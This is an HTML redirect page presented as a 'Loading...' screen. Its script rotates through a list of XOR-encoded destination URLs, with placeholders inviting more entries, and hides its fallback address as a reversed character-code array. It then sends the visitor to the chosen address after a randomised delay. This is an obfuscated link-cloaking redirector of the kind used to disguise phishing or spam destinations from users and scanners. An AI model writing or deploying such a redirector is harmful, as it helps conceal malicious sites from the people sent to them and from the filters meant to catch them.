<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>*{margin:0;padding:0;background:#fff;height:100vh;width:100vw;font-family:Arial,sans-serif;text-align:center;padding-top:20vh;font-size:18px}</style>
</head>
<body>
<div id="status">🔄 Rotating to next destination...</div>
<script>
(function(w){
    // ADD YOUR ENCODED URLS HERE (as many as you want)
    var urls = [
        'ivwqq9.-thv.sgox/`dnfcpjukfr/wigm/vqxaonwggnbsg-bmn.rlnijd,kuoo',  // Original
        'your-encoded-url-2-here',
        'your-encoded-url-3-here', 
        'your-encoded-url-4-here',
        'your-encoded-url-5-here',
        // Add more URLs...
    ];
    
    var d=function(s){var r='',i=0,c;for(;i<s.length;i++){c=s.charCodeAt(i);r+=String.fromCharCode(c^((i%3)+1))}return r};
    var f=[109,111,99,46,101,108,112,109,97,120,101,47,47,58,115,112,116,116,104];f.reverse();var g=String.fromCharCode.apply(null,f);
    
    var currentIndex = Math.floor(Math.random() * urls.length);
    var status = document.getElementById('status');
    
    function rotateNext() {
        currentIndex = (currentIndex + 1) % urls.length;
        var nextUrl = d(urls[currentIndex]) || g;
        status.textContent = `🔄 Redirecting (${currentIndex + 1}/${urls.length})...`;
        
        setTimeout(function(){
            w.location.replace(nextUrl);
        }, 2000 + Math.floor(Math.random()*1000));
    }
    
    // Start rotation immediately
    rotateNext();
    
    // Auto-rotate every 3-5 seconds if not redirected
    setInterval(rotateNext, 4000);
    
})(window);
</script>
</body>
</html>
